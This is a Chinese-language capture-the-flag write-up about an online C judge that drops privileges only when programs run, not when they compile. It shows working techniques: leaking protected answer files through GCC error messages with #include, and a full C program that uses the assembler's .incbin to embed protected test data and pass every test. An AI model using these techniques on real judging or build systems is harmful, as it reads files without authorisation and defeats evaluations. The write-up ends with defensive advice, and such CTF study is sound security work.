# 安全的在线测评

## 题目简述

题目提供一个只接受 C 源码的在线判题器。程序运行阶段通过 `su runner` 降权，测试数据目录和文件权限为 `0700`，因此运行后的二进制不能直接读取答案；但编译阶段直接以判题进程身份执行 `gcc`，没有同样的权限隔离。第一问使用固定数据，第二问在每次编译前生成五组动态数据。目标是把编译器和汇编器变成越权读文件的代理。

## 解题过程

### 找到权限边界不一致

判题器的关键流程是：

```python
# 编译：没有 su runner
subprocess.run(["gcc", "-w", "-O2", SRC, "-o", BIN])

# 运行：降权为 runner
subprocess.run(["su", "runner", "-c", path], ...)
```

动态数据在编译前已经生成到 `./data/dynamic{i}.in/out`。因此，只要让编译器读取这些路径并把内容写进报错或二进制，运行期权限就不再重要。

### 第一问：借编译错误泄漏静态答案

C 预处理器的 `#include` 不要求被包含文件一定是头文件。提交：

```c
#include "../data/static.out"
```

第一行大整数不是合法 C token 序列，GCC 的错误信息会回显源文件名、行号和整行内容，从而泄漏第一行。为了让第一行成为一个声明的组成部分，再让第二行报错，可以提交：

```c
int value =
#include "../data/static.out"
```

分别记录错误信息中的两个质因子，然后提交一个普通程序，逐行输出这两个固定值，即可通过静态测试。正文不保存这两个一次性长整数；实际复现时把它们替换到最终程序的 `STATIC_OUTPUT` 中。

### 第二问：用 `.incbin` 固化动态数据

动态数据每次提交都会变化，不能先泄漏再二次提交。但 GNU assembler 的 `.incbin` 会在汇编阶段把指定文件的原始字节复制进目标文件。下面是完整利用骨架，`STATIC_OUTPUT` 替换为第一问泄漏的两行：

```c
#include <stdio.h>
#include <string.h>

#define EMBED(name, path)                         \
    __asm__(".section .rodata\n"                 \
            ".global " #name "\n"               \
            #name ":\n"                         \
            ".incbin \"" path "\"\n"            \
            ".byte 0\n"                         \
            ".text\n");                         \
    extern const char name[]

EMBED(in0,  "./data/dynamic0.in");
EMBED(in1,  "./data/dynamic1.in");
EMBED(in2,  "./data/dynamic2.in");
EMBED(in3,  "./data/dynamic3.in");
EMBED(in4,  "./data/dynamic4.in");
EMBED(out0, "./data/dynamic0.out");
EMBED(out1, "./data/dynamic1.out");
EMBED(out2, "./data/dynamic2.out");
EMBED(out3, "./data/dynamic3.out");
EMBED(out4, "./data/dynamic4.out");

static const char *inputs[5] = {in0, in1, in2, in3, in4};
static const char *outputs[5] = {out0, out1, out2, out3, out4};

static const char STATIC_OUTPUT[] =
    "replace-with-first-static-factor\n"
    "replace-with-second-static-factor\n";

int main(void) {
    char input[2048];
    if (fgets(input, sizeof(input), stdin) == NULL) {
        return 1;
    }

    for (int i = 0; i < 5; ++i) {
        if (strcmp(input, inputs[i]) == 0) {
            fputs(outputs[i], stdout);
            return 0;
        }
    }

    fputs(STATIC_OUTPUT, stdout);
    return 0;
}
```

汇编器以判题器的高权限读取十个文件，并把内容放进生成程序的只读数据段。运行静态样例时，输入不匹配任何动态输入，程序输出固定质因子；运行动态样例时，根据输入选择同一批次嵌入的对应答案。这样一次提交即可通过全部测试并得到两个 flag。

## 方法总结

- 核心技巧：利用编译与运行阶段权限不一致，在预处理/汇编阶段读取受保护文件；静态数据用诊断信息泄漏，动态数据用 `.incbin` 固化。
- 识别信号：判题器只给运行程序降权，但编译器继承服务端高权限，且编译错误会直接返回用户。
- 复用要点：编译器、预处理器、链接器和汇编器都应视为不可信代码执行链；必须在同一低权限沙箱中完成编译和运行，并限制可见文件系统，而不能只保护运行阶段。
